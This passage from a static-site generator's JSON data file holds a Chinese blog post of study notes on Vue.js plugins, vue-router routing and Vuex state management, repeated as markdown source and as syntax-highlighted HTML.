     }\n});\n\n//在任何vue文件中都可以获取该数据\n\n```\n\n```vue\n<template>\n    <div>\n        //获取数据\n          {{ $store.state.count }}\n    </div>\n</template>\n\n<script>\nexport default {\n    name:'Counter',\n    //使用computed方法显示\n    computed:{\n        count(){\n            return this.$store.state.count;\n        }\n    }\n}\n</script>\n\n<style>\n\n</style>\n```\n\n3.修改vuex的数据\n\n```vue\nconst store=new Vuex.Store({\n      state:{\n        count:0\n      },\n//首先在store中声明两个mutations\n      mutations:{\n//increase可以再添加一个参数来控制数值改变的大小；\n        increase(state){\n          state.count+=1;\n        },\n        decrease(state){\n          state.count-=1;\n        }\n      }\n});\n\n\n<template>\n    <div>\n        <button @click=\"handleIncrease\">+1</button>\n          {{ count }}\n        <button @click=\"handleDecrease\">-1</button>  \n    </div>\n</template>\n\n<script>\nimport Button from './Button.vue';\nexport default {\n  components: { Button },\n    name:'Counter',\n    computed:{\n        count(){\n            return this.$store.state.count;\n        }\n    },\n    //使用methods方法来调用mutations实现数据修改；\n    methods:{\n        handleIncrease:function(){\n            this.$store.commit('increase');\n        },\n        handleDecrease:function(){\n            this.$store.commit('decrease');\n        }\n    }\n}\n</script>\n```\n\nES6小语法：\n\n```javascript\n//函数的参数可以设定默认值，当没有传入参数使用默认参数;一个参数不够时，可以传入一个对象，无限扩展；\nincrease（state，n){\n    n=n || 1;\n}\n```\n\n4.高级用法\n\n","source":"_posts/Vue.js实战（8）.md","raw":"---\ntitle: Vue.js实战（8）\ndate: 2020-12-5 21:18:45\ncategories: \n    - 前端\ntags: \n    - VUE\n    - 笔记\n    - Vue.js实战\nmp3: \ncover: img/vue_js_shizhan.jpg\n---\n\n\nCh11 插件\n\n一、插件得创建和使用\n\n```javascript\n //公开的方法install，参数1：VUe构造器，参数2：可选对象     \nMyPlugin.install=function(Vue,options){\n            //全剧注册组件\n            Vue.component('component-name',{\n                //组件内容\n            })\n            //添加实例方法\n            Vue.prototype.$Notice=function(){\n                //逻辑。。\n            }\n            //添加全局方法或属性\n            Vue.globalMethod=function(){\n                //逻辑\n            }\n            //添加全局混合\n            Vue.mixin({\n                mounted:function(){\n                    //逻辑 \n                }\n            })\n        }\n//Vue.use()来使用插件\n        Vue.use(MyPlugin)\n```\n\n二、前端路由与Vue-router\n\n​\t\t1.实现方式\n\n- 利用url得hash，即所谓的锚点（#）\n\n- HTML5得History模式：需要服务器支持\n\n  2.vue-router基本用法\n\n  ```javascript\n  //在webpack项目中安装vue-router\n  npm install --save vue-router\n  \n  import Vue from 'vue'\n  import Router from 'vue-router'\n  \n  Vue.use(Router)\n  \n  //index.js\n  routes: [\n      {\n        path: '/',\n        component: Movie\n      },\n      {\n        path:'/login',\n          //一次性全部加载\n        component:Login\n      },\n      {\n        path:'/test',\n        component:Test\n      },\n      {\n        path:'/index',\n        component:(resolve)=>require(['../components/Index.vue'],resolve)\n      },\n      {\n        path:'/about',\n          //懒加载（按需加载）mwebpack会把每一个路由打包为一个js文件，当请求到该页面时，才会去加载这个页面得js\n        component:(resolve)=>require(['../components/About.vue'],resolve)\n      },\n      //包含了用户Id得路由，指向同一界面；\n       {\n        path:'/user/:id',\n        component:(resolve)=>require(['../components/User.vue'],resolve)\n      }\n    ] \n  \n  \n  ******************************\n  \n  ```\n\n  3.ES6小语法\n\n  在ES6中，使用let和const代替var来声明变量，const声明常量不可修改；\n\n  let和const得作用域是块（使用了异步路由后，编译出的每个js都叫做快（chunk)）；\n\n  4.小细节\n\n  在router.js中，设置mode为history才会开启HTML5得路由模式，通过’/‘设置路径，否则为’#‘\n\n  5.跳转\n\n  ```vue\n  <router-link to=\"/about\">About</router-link>\n  \n      //页面跳转方法2\n      <button @click=\"changeToMain\">Index</button>\n      \n       methods:{\n      changeToMain(){\n        //不可以跳转到当前页面路由本身，会报出冗余错误\n        this.$router.push('/passage');\n      }\n    }\n  ```\n\n  \n\n- tag:tag可以指定渲染成什么标签，比如tag=\"li\",会渲染成li\n\n- replace：使用后不可以使用返回键回到上一个页面\n\n- go:在history记录中向前或者向后退多少步，参数为整数   this.$router.go(-1)或(2)\n\n三、状态\n\n管理与Vuex\n\n​\t1.状态管理与使用场景\n\n```javascript\nnpm install --save vuex\n```\n\n​\t2.Vuex得使用\n\n```javascript\n//main.js\nimport Vuex from 'Vuex'\n\nVue.use(Vuex);\n\nconst store=new Vuex.Store({\n      state:{\n          //定义一个数据\n        \tcount:0\n      }\n});\n\n//在任何vue文件中都可以获取该数据\n\n```\n\n```vue\n<template>\n    <div>\n        //获取数据\n          {{ $store.state.count }}\n    </div>\n</template>\n\n<script>\nexport default {\n    name:'Counter',\n    //使用computed方法显示\n    computed:{\n        count(){\n            return this.$store.state.count;\n        }\n    }\n}\n</script>\n\n<style>\n\n</style>\n```\n\n3.修改vuex的数据\n\n```vue\nconst store=new Vuex.Store({\n      state:{\n        count:0\n      },\n//首先在store中声明两个mutations\n      mutations:{\n//increase可以再添加一个参数来控制数值改变的大小；\n        increase(state){\n          state.count+=1;\n        },\n        decrease(state){\n          state.count-=1;\n        }\n      }\n});\n\n\n<template>\n    <div>\n        <button @click=\"handleIncrease\">+1</button>\n          {{ count }}\n        <button @click=\"handleDecrease\">-1</button>  \n    </div>\n</template>\n\n<script>\nimport Button from './Button.vue';\nexport default {\n  components: { Button },\n    name:'Counter',\n    computed:{\n        count(){\n            return this.$store.state.count;\n        }\n    },\n    //使用methods方法来调用mutations实现数据修改；\n    methods:{\n        handleIncrease:function(){\n            this.$store.commit('increase');\n        },\n        handleDecrease:function(){\n            this.$store.commit('decrease');\n        }\n    }\n}\n</script>\n```\n\nES6小语法：\n\n```javascript\n//函数的参数可以设定默认值，当没有传入参数使用默认参数;一个参数不够时，可以传入一个对象，无限扩展；\nincrease（state，n){\n    n=n || 1;\n}\n```\n\n4.高级用法\n\n","slug":"Vue.js实战（8）","published":1,"updated":"2021-01-12T02:36:08.000Z","_id":"clg29vyhh003wao9cdp1sboix","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Ch11 插件</p>\n<p>一、插件得创建和使用</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"> <span class=\"hljs-comment\">//公开的方法install，参数1：VUe构造器，参数2：可选对象     </span><br><span class=\"hljs-title class_\">MyPlugin</span>.<span class=\"hljs-property\">install</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">Vue,options</span>)&#123;<br>            <span class=\"hljs-comment\">//全剧注册组件</span><br>            <span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-title function_\">component</span>(<span class=\"hljs-string\">&#x27;component-name&#x27;</span>,&#123;<br>                <span class=\"hljs-comment\">//组件内容</span><br>            &#125;)<br>            <span class=\"hljs-comment\">//添加实例方法</span><br>            <span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>.<span class=\"hljs-property\">$Notice</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>                <span class=\"hljs-comment\">//逻辑。。</span><br>            &#125;<br>            <span class=\"hljs-comment\">//添加全局方法或属性</span><br>            <span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-property\">globalMethod</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>                <span class=\"hljs-comment\">//逻辑</span><br>            &#125;<br>            <span class=\"hljs-comment\">//添加全局混合</span><br>            <span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-title function_\">mixin</span>(&#123;<br>                <span class=\"hljs-attr\">mounted</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>                    <span class=\"hljs-comment\">//逻辑 </span><br>                &#125;<br>            &#125;)<br>        &#125;<br><span class=\"hljs-comment\">//Vue.use()来使用插件</span><br>        <span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-title function_\">use</span>(<span class=\"hljs-title class_\">MyPlugin</span>)<br></code></pre></td></tr></table></figure>\n\n<p>二、前端路由与Vue-router</p>\n<p>​        1.实现方式</p>\n<ul>\n<li><p>利用url得hash，即所谓的锚点（#）</p>\n</li>\n<li><p>HTML5得History模式：需要服务器支持</p>\n<p>2.vue-router基本用法</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">//在webpack项目中安装vue-router</span><br>npm install --save vue-router<br><br><span class=\"hljs-keyword\">import</span> <span class=\"hljs-title class_\">Vue</span> <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;vue&#x27;</span><br><span class=\"hljs-keyword\">import</span> <span class=\"hljs-title class_\">Router</span> <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;vue-router&#x27;</span><br><br><span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-title function_\">use</span>(<span class=\"hljs-title class_\">Router</span>)<br><br><span class=\"hljs-comment\">//index.js</span><br><span class=\"hljs-attr\">routes</span>: [<br>    &#123;<br>      <span class=\"hljs-attr\">path</span>: <span class=\"hljs-string\">&#x27;/&#x27;</span>,<br>      <span class=\"hljs-attr\">component</span>: <span class=\"hljs-title class_\">Movie</span><br>    &#125;,<br>    &#123;<br>      <span class=\"hljs-attr\">path</span>:<span class=\"hljs-string\">&#x27;/login&#x27;</span>,<br>        <span class=\"hljs-comment\">//一次性全部加载</span><br>      <span class=\"hljs-attr\">component</span>:<span class=\"hljs-title class_\">Login</span><br>    &#125;,<br>    &#123;<br>      <span class=\"hljs-attr\">path</span>:<span class=\"hljs-string\">&#x27;/test&#x27;</span>,<br>      <span class=\"hljs-attr\">component</span>:<span class=\"hljs-title class_\">Test</span><br>    &#125;,<br>    &#123;<br>      <span class=\"hljs-attr\">path</span>:<span class=\"hljs-string\">&#x27;/index&#x27;</span>,<br>      <span class=\"hljs-attr\">component</span>:<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve</span>)=&gt;</span><span class=\"hljs-built_in\">require</span>([<span class=\"hljs-string\">&#x27;../components/Index.vue&#x27;</span>],resolve)<br>    &#125;,<br>    &#123;<br>      <span class=\"hljs-attr\">path</span>:<span class=\"hljs-string\">&#x27;/about&#x27;</span>,<br>        <span class=\"hljs-comment\">//懒加载（按需加载）mwebpack会把每一个路由打包为一个js文件，当请求到该页面时，才会去加载这个页面得js</span><br>      <span class=\"hljs-attr\">component</span>:<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve</span>)=&gt;</span><span class=\"hljs-built_in\">require</span>([<span class=\"hljs-string\">&#x27;../components/About.vue&#x27;</span>],resolve)<br>    &#125;,<br>    <span class=\"hljs-comment\">//包含了用户Id得路由，指向同一界面；</span><br>     &#123;<br>      <span class=\"hljs-attr\">path</span>:<span class=\"hljs-string\">&#x27;/user/:id&#x27;</span>,<br>      <span class=\"hljs-attr\">component</span>:<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve</span>)=&gt;</span><span class=\"hljs-built_in\">require</span>([<span class=\"hljs-string\">&#x27;../components/User.vue&#x27;</span>],resolve)<br>    &#125;<br>  ] <br><br><br>******************************<br><br></code></pre></td></tr></table></figure>\n\n<p>3.ES6小语法</p>\n<p>在ES6中，使用let和const代替var来声明变量，const声明常量不可修改；</p>\n<p>let和const得作用域是块（使用了异步路由后，编译出的每个js都叫做快（chunk)）；</p>\n<p>4.小细节</p>\n<p>在router.js中，设置mode为history才会开启HTML5得路由模式，通过’/‘设置路径，否则为’#‘</p>\n<p>5.跳转</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vue\">&lt;router-link to=&quot;/about&quot;&gt;About&lt;/router-link&gt;<br><br>    //页面跳转方法2<br>    &lt;button @click=&quot;changeToMain&quot;&gt;Index&lt;/button&gt;<br>    <br>     methods:&#123;<br>    changeToMain()&#123;<br>      //不可以跳转到当前页面路由本身，会报出冗余错误<br>      this.$router.push(&#x27;/passage&#x27;);<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure></li>\n<li><p>tag:tag可以指定渲染成什么标签，比如tag=”li”,会渲染成li</p>\n</li>\n<li><p>replace：使用后不可以使用返回键回到上一个页面</p>\n</li>\n<li><p>go:在history记录中向前或者向后退多少步，参数为整数   this.$router.go(-1)或(2)</p>\n</li>\n</ul>\n<p>三、状态</p>\n<p>管理与Vuex</p>\n<p>​    1.状态管理与使用场景</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\">npm install --save vuex<br></code></pre></td></tr></table></figure>\n\n<p>​    2.Vuex得使用</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">//main.js</span><br><span class=\"hljs-keyword\">import</span> <span class=\"hljs-title class_\">Vuex</span> <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;Vuex&#x27;</span><br><br><span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-title function_\">use</span>(<span class=\"hljs-title class_\">Vuex</span>);<br><br><span class=\"hljs-keyword\">const</span> store=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vuex</span>.<span class=\"hljs-title class_\">Store</span>(&#123;<br>      <span class=\"hljs-attr\">state</span>:&#123;<br>          <span class=\"hljs-comment\">//定义一个数据</span><br>        \t<span class=\"hljs-attr\">count</span>:<span class=\"hljs-number\">0</span><br>      &#125;<br>&#125;);<br><br><span class=\"hljs-comment\">//在任何vue文件中都可以获取该数据</span><br><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vue\">&lt;template&gt;<br>    &lt;div&gt;<br>        //获取数据<br>          &#123;&#123; $store.state.count &#125;&#125;<br>    &lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>export default &#123;<br>    name:&#x27;Counter&#x27;,<br>    //使用computed方法显示<br>    computed:&#123;<br>        count()&#123;<br>            return this.$store.state.count;<br>        &#125;<br>    &#125;<br>&#125;<br>&lt;/script&gt;<br><br>&lt;style&gt;<br><br>&lt;/style&gt;<br></code></pre></td></tr></table></figure>\n\n<p>3.修改vuex的数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vue\">const store=new Vuex.Store(&#123;<br>      state:&#123;<br>        count:0<br>      &#125;,<br>//首先在store中声明两个mutations<br>      mutations:&#123;<br>//increase可以再添加一个参数来控制数值改变的大小；<br>        increase(state)&#123;<br>          state.count+=1;<br>        &#125;,<br>        decrease(state)&#123;<br>          state.count-=1;<br>        &#125;<br>      &#125;<br>&#125;);<br><br><br>&lt;template&gt;<br>    &lt;div&gt;<br>        &lt;button @click=&quot;handleIncrease&quot;&gt;+1&lt;/button&gt;<br>          &#123;&#123; count &#125;&#125;<br>        &lt;button @click=&quot;handleDecrease&quot;&gt;-1&lt;/button&gt;  <br>    &lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>import Button from &#x27;./Button.vue&#x27;;<br>export default &#123;<br>  components: &#123; Button &#125;,<br>    name:&#x27;Counter&#x27;,<br>    computed:&#123;<br>        count()&#123;<br>            return this.$store.state.count;<br>        &#125;<br>    &#125;,<br>    //使用methods方法来调用mutations实现数据修改；<br>    methods:&#123;<br>        handleIncrease:function()&#123;<br>            this.$store.commit(&#x27;increase&#x27;);<br>        &#125;,<br>        handleDecrease:function()&#123;<br>            this.$store.commit(&#x27;decrease&#x27;);<br>        &#125;<br>    &#125;<br>&#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>\n\n<p>ES6小语法：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">//函数的参数可以设定默认值，当没有传入参数使用默认参数;一个参数不够时，可以传入一个对象，无限扩展；</span><br>increase（state，n)&#123;<br>    n=n || <span class=\"hljs-number\">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>4.高级用法</p>\n","site":{"data":{}},"excerpt":"","more":"<p>Ch11 插件</p>\n<p>一、插件得创建和使用</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"> <span class=\"hljs-comment\">//公开的方法install，参数1：VUe构造器，参数2：可选对象     </span><br><span class=\"hljs-title class_\">MyPlugin</span>.<span class=\"hljs-property\">install</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">Vue,options</span>)&#123;<br>            <span class=\"hljs-comment\">//全剧注册组件</span><br>            <span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-title function_\">component</span>(<span class=\"hljs-string\">&#x27;component-name&#x27;</span>,&#123;<br>                <span class=\"hljs-comment\">//组件内容</span><br>            &#125;)<br>            <span class=\"hljs-comment\">//添加实例方法</span><br>            <span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>.<span class=\"hljs-property\">$Notice</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>                <span class=\"hljs-comment\">//逻辑。。</span><br>            &#125;<br>            <span class=\"hljs-comment\">//添加全局方法或属性</span><br>            <span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-property\">globalMethod</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>                <span class=\"hljs-comment\">//逻辑</span><br>            &#125;<br>            <span class=\"hljs-comment\">//添加全局混合</span><br>            <span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-title function_\">mixin</span>(&#123;<br>                <span class=\"hljs-attr\">mounted</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>                    <span class=\"hljs-comment\">//逻辑 </span><br>                &#125;<br>            &#125;)<br>        &#125;<br><span class=\"hljs-comment\">//Vue.use()来使用插件</span><br>        <span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-title function_\">use</span>(<span class=\"hljs-title class_\">MyPlugin</span>)<br></code></pre></td></tr></table></figure>\n\n<p>二、前端路由与Vue-router</p>\n<p>​        1.实现方式</p>\n<ul>\n<li><p>利用url得hash，即所谓的锚点（#）</p>\n</li>\n<li><p>HTML5得History模式：需要服务器支持</p>\n<p>2.vue-router基本用法</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">//在webpack项目中安装vue-router</span><br>npm install --save vue-router<br><br><span class=\"hljs-keyword\">import</span> <span class=\"hljs-title class_\">Vue</span> <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;vue&#x27;</span><br><span class=\"hljs-keyword\">import</span> <span class=\"hljs-title class_\">Router</span> <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;vue-router&#x27;</span><br><br><span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-title function_\">use</span>(<span class=\"hljs-title class_\">Router</span>)<br><br><span class=\"hljs-comment\">//index.js</span><br><span class=\"hljs-attr\">routes</span>: [<br>    &#123;<br>      <span class=\"hljs-attr\">path</span>: <span class=\"hljs-string\">&#x27;/&#x27;</span>,<br>      <span class=\"hljs-attr\">component</span>: <span class=\"hljs-title class_\">Movie</span><br>    &#125;,<br>    &#123;<br>      <span class=\"hljs-attr\">path</span>:<span class=\"hljs-string\">&#x27;/login&#x27;</span>,<br>        <span class=\"hljs-comment\">//一次性全部加载</span><br>      <span class=\"hljs-attr\">component</span>:<span class=\"hljs-title class_\">Login</span><br>    &#125;,<br>    &#123;<br>      <span class=\"hljs-attr\">path</span>:<span class=\"hljs-string\">&#x27;/test&#x27;</span>,<br>      <span class=\"hljs-attr\">component</span>:<span class=\"hljs-title class_\">Test</span><br>    &#125;,<br>    &#123;<br>      <span class=\"hljs-attr\">path</span>:<span class=\"hljs-string\">&#x27;/index&#x27;</span>,<br>      <span class=\"hljs-attr\">component</span>:<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve</span>)=&gt;</span><span class=\"hljs-built_in\">require</span>([<span class=\"hljs-string\">&#x27;../components/Index.vue&#x27;</span>],resolve)<br>    &#125;,<br>    &#123;<br>      <span class=\"hljs-attr\">path</span>:<span class=\"hljs-string\">&#x27;/about&#x27;</span>,<br>        <span class=\"hljs-comment\">//懒加载（按需加载）mwebpack会把每一个路由打包为一个js文件，当请求到该页面时，才会去加载这个页面得js</span><br>      <span class=\"hljs-attr\">component</span>:<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve</span>)=&gt;</span><span class=\"hljs-built_in\">require</span>([<span class=\"hljs-string\">&#x27;../components/About.vue&#x27;</span>],resolve)<br>    &#125;,<br>    <span class=\"hljs-comment\">//包含了用户Id得路由，指向同一界面；</span><br>     &#123;<br>      <span class=\"hljs-attr\">path</span>:<span class=\"hljs-string\">&#x27;/user/:id&#x27;</span>,<br>      <span class=\"hljs-attr\">component</span>:<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve</span>)=&gt;</span><span class=\"hljs-built_in\">require</span>([<span class=\"hljs-string\">&#x27;../components/User.vue&#x27;</span>],resolve)<br>    &#125;<br>  ] <br><br><br>******************************<br><br></code></pre></td></tr></table></figure>\n\n<p>3.ES6小语法</p>\n<p>在ES6中，使用let和const代替var来声明变量，const声明常量不可修改；</p>\n<p>let和const得作用域是块（使用了异步路由后，编译出的每个js都叫做快（chunk)）；</p>\n<p>4.小细节</p>\n<p>在router.js中，设置mode为history才会开启HTML5得路由模式，通过’/‘设置路径，否则为’#‘</p>\n<p>5.跳转</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vue\">&lt;router-link to=&quot;/about&quot;&gt;About&lt;/router-link&gt;<br><br>    //页面跳转方法2<br>    &lt;button @click=&quot;changeToMain&quot;&gt;Index&lt;/button&gt;<br>    <br>     methods:&#123;<br>    changeToMain()&#123;<br>      //不可以跳转到当前页面路由本身，会报出冗余错误<br>      this.$router.push(&#x27;/passage&#x27;);<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure></li>\n<li><p>tag:tag可以指定渲染成什么标签，比如tag=”li”,会渲染成li</p>\n</li>\n<li><p>replace：使用后不可以使用返回键回到上一个页面</p>\n</li>\n<li><p>go:在history记录中向前或者向后退多少步，参数为整数   this.$router.go(-1)或(2)</p>\n</li>\n</ul>\n<p>三、状态</p>\n<p>管理与Vuex</p>\n<p>​    1.状态管理与使用场景</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\">npm install --save 